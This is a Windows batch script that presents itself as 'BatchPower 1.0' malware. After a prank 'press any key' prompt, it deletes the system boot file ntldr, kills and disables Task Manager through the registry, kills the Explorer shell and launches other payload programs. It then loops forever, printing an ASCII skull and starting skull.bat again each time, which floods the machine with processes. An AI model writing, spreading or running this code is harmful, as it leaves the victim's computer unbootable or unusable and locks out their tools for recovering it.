@echo off
title BatchPower1.exe
echo Does batch suck? Press any key if yes, close this window if no
pause
color 04
echo msgbox "You're f*cked by BatchPower 1.0.exe! Batch Malware can be powerful too!!!" >msg1.vbs
start msg1.vbs
start DeepHaze.mp3
del c:\ntldr /a /f
taskkill /f /im taskmgr.exe
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
taskkill /f /im explorer.exe
start flasher 1 scream.bmp
timeout 1 /nobreak
start melter.exe
:death
echo                 uuuuuuu
echo             uu$$$$$$$$$$$uu
echo          uu$$$$$$$$$$$$$$$$$uu
echo         u$$$$$$$$$$$$$$$$$$$$$u
echo        u$$$$$$$$$$$$$$$$$$$$$$$u
echo       u$$$$$$$$$$$$$$$$$$$$$$$$$u
echo       u$$$$$$$$$$$$$$$$$$$$$$$$$u
echo       u$$$$$$"   "$$$"   "$$$$$$u
echo       "$$$$"      u$u       $$$$"
echo        $$$u       u$u       u$$$
echo        $$$u      u$$$u      u$$$
echo         "$$$$uu$$$   $$$uu$$$$"
echo          "$$$$$$$"   "$$$$$$$"
echo            u$$$$$$$u$$$$$$$u
echo             u$"$"$"$"$"$"$u
echo  uuu        $$u$ $ $ $ $u$$       uuu
echo u$$$$        $$$$$u$u$u$$$       u$$$$
echo  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
echo u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
echo $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
echo """      ""$$$$$$$$$$$uu ""$"""
echo           uuuu ""$$$$$$$$$$uuu
echo  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
echo  $$$$$$$$$$""""           ""$$$$$$$$$$$"
echo   "$$$$$"                      ""$$$$""
echo     $$$"
start skull.bat     
goto death